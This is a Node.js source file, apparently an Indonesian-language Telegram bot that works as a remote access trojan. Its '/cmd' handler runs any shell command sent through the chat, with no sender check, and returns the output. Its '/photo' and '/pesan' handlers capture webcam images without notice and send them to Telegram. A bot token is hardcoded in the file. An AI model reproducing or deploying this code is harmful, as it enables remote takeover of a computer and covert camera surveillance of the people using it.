const TelegramBot = require('node-telegram-bot-api');
const { exec }    = require('child_process');
const notifier = require('node-notifier');
var NodeWebcam = require( "node-webcam" );


//Default options

var opts = {
  width: 1280,
  height: 720,
  quality: 100,
  frames: 60,
  delay: 0,
  saveShots: true,
  output: "jpeg",
  device: false,
  callbackReturn: "location",
  verbose: false
};

//Creates webcam instance

var Webcam = NodeWebcam.create( opts );
// replace the value below with the Telegram token you receive from @BotFather
const token = '5248165058:AAHjVQZtzTwWAz7nZQ9ATTAAnTZ8zbA1zDI';
const bot = new TelegramBot(token, {polling: true});
bot.onText(/\/echo (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const resp = match[1]; 
  bot.sendMessage(chatId, resp);
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if(text.search("/cmd ") > -1){
    regex = /\/cmd/i;
    pesan = text.replace(regex, '');
    exec(pesan, (err, stdout, stderr) => {
        if (err) {
          bot.sendMessage(chatId, `stdout: ${err}`);
          // node couldn't execute the command
          return;
        }
        
        bot.sendMessage(chatId, `stdout: ${stdout}`);
        bot.sendMessage(chatId, `stdout: ${stderr}`);
    
    });

  }else if(text.search("/pesan ") > -1){

    var pisahkan_jml = text.split(":");
    var jml = (pisahkan_jml[1])?pisahkan_jml[1]:1;

    for (let i = 1; i <= jml; i++) {
      regex = /\/pesan/i;
      pesan = pisahkan_jml[0].replace(regex, '');
      notifier
        .notify({ message: pesan , wait: false }, function(err, data) {
          // Will also wait until notification is closed.
          var d = Date.now();
          Webcam.capture("notif_pesan", function( err, data ) {
            if ( !err ) {
              var photo = __dirname+'/'+data; 
              bot.sendPhoto(chatId, photo, {caption: pesan});

            }else{
              bot.sendMessage(chatId, 'Notifikasi ditutup');
              bot.sendMessage(chatId, 'gagal membuka kamera');
            };
          } );
        })
    }

    

  }else if(text.search("/photo") > -1){
    var d = Date.now();
    Webcam.capture("ambil_photo", function( err, data ) {
      if ( !err ) {
        var photo = __dirname+'/'+data; 
        bot.sendPhoto(chatId, photo, {caption: "Mengambil photo"});

      }else{
        bot.sendMessage(chatId, 'gagal Mengambil photo');
      };
    });

  }else{

    bot.sendMessage(chatId, 'gunakan Perintah /cmd | /pesan | /photo');

  }
  
});